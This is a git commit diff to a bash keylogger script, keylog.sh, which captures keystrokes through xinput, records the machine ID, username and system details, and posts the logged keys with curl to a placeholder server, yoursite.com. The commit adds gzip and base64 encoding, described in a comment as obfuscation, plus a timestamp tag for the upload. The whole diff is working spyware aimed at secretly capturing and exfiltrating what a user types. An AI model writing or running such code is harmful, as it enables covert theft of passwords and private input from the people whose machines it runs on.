ceb3c0524112bf2671837527f74d031d4b2e0c6b
Alexandre-Xavier Labonté-Lamoureux <alexandrexavier@live.ca>
2018-11-24 01:56:29 -0500

    Compress the data that's sent

--- keylog.sh
+++ keylog.sh
@@ -6,6 +6,7 @@
 
 keycodes="/tmp/keycodes"
 translation="/tmp/translation"
+compressed="/tmp/translation.bin"
 
 function capture {
 	xinput --test $1 | grep --line-buffered "key press" | awk '{print $3; system("");}' > $keycodes
@@ -15,8 +16,11 @@ function capture {
 computerid=$(cat /var/lib/dbus/machine-id)
 uname=$(uname -srm)
 me=$(whoami)
+timestamp=$(date '+%s')
 
 echo "Hi $me, your ID is: $computerid"
+
+echo "Tag: $timestamp"
 
 # Get keyboard string. The name of the targeted device must be added to the grep.
 devline=$(xinput list | grep -e 'AT Translated Set 2 keyboard' -e 'USB Keyboard')
@@ -27,7 +31,7 @@ idstr=$(echo $devline | grep -Po 'id=[0-9]*')
 # Extract device ID number
 idnum=$(echo $idstr | grep -Po '[0-9]*')
 
-echo "Your keyboard has device number $idnum"
+echo "Your keyboard has the device number $idnum"
 
 # Get the map of the keyboard
 keymap=$(xmodmap -pke)
@@ -67,10 +71,15 @@ while true; do
 			echo "${KEY_ARRAY[$p]} " >> $translation
 		done < $keycodes
 
-		# Improvements: 1- Compress the data, 2- Send the start date of the capture so the server doesn't overwrite the same file
-		curl -X POST --header "cpu: $computerid" -A "$me on $uname" -d @$translation http://yoursite.com/server.php
+		# Make the data smaller. At the same time, this adds some level of obfuscation.
+		gzip -c $translation | base64 > $compressed
 
+		# Send the data to the server
+		curl -X POST --header "cpu: $computerid" --cookie "tag=$timestamp" -A "$me on $uname" -d @$compressed http://yoursite.com/server.php
+
+		# Cleanup before the next iteration
 		rm -f $translation
+		rm -f $compressed
 
 		echo "sent"
 	fi
